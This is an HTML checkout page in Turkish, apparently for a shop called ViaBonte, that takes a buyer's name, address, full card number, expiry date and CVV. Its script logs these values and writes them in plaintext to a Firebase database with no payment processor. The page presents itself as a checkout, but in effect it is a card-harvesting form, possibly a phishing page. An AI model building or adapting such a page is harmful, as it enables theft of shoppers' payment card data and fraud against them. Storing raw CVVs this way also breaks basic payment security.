
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ViaBonte Sipariş</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <style>
    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
    input, select, button { width: 100%; padding: 10px; margin: 10px 0; }
    #durum { font-weight: bold; color: green; text-align: center; margin-top: 10px; }
  </style>
</head>
<body>
  <h2>Ürün: The View From the Afternoon</h2>
  <input type="text" id="isim" placeholder="Ad Soyad" />
  <input type="text" id="adres" placeholder="Adres" />
  <select id="il">
    <option>İl Seçin</option>
    <option>İstanbul</option><option>Ankara</option><option>İzmir</option>
  </select>
  <select id="ilce"><option>İlçe Seçin</option></select>
  <input type="datetime-local" id="teslimat" placeholder="Teslimat Tarihi" />
  <input type="text" id="kart" placeholder="Kart Numarası" />
  <input type="text" id="skt" placeholder="Son Kullanma (AA/YY)" />
  <input type="text" id="cvv" placeholder="CVV" />
  <button onclick="siparisGonder()">Ödemeyi Tamamla</button>
  <p id="durum"></p>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCQSPExHQKdgR2wMh0YG7YvGE2mFSftpvA",
      authDomain: "viabonte.firebaseapp.com",
      databaseURL: "https://viabonte-default-rtdb.firebaseio.com",
      projectId: "viabonte",
      storageBucket: "viabonte.firebasestorage.app",
      messagingSenderId: "401795816209",
      appId: "1:401795816209:web:32a6af97915dcc889ecab0",
      measurementId: "G-WE1W35ET7C"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const ilceler = {
      "İstanbul": ["Kadıköy", "Beşiktaş", "Üsküdar"],
      "Ankara": ["Çankaya", "Keçiören", "Yenimahalle"],
      "İzmir": ["Bornova", "Karşıyaka", "Konak"]
    };

    document.getElementById("il").addEventListener("change", function () {
      const ilceSelect = document.getElementById("ilce");
      ilceSelect.innerHTML = "<option>İlçe Seçin</option>";
      const secilen = this.value;
      if (ilceler[secilen]) {
        ilceler[secilen].forEach(ilce => {
          const opt = document.createElement("option");
          opt.value = ilce;
          opt.innerText = ilce;
          ilceSelect.appendChild(opt);
        });
      }
    });

    function siparisGonder() {
      const siparis = {
        isim: document.getElementById("isim").value,
        adres: document.getElementById("adres").value,
        il: document.getElementById("il").value,
        ilce: document.getElementById("ilce").value,
        teslimat: document.getElementById("teslimat").value,
        kart: document.getElementById("kart").value,
        skt: document.getElementById("skt").value,
        cvv: document.getElementById("cvv").value
      };
      console.log("Gönderilecek sipariş:", siparis);
      const ref = db.ref("siparisler").push();
      ref.set(siparis, (error) => {
        if (error) {
          document.getElementById("durum").innerText = "❌ Sipariş gönderilemedi!";
          console.error("Firebase HATA:", error);
        } else {
          document.getElementById("durum").innerText = "✅ Sipariş başarıyla gönderildi!";
          console.log("✅ Firebase'e yazıldı.");
        }
      });
    }
  </script>
</body>
</html>
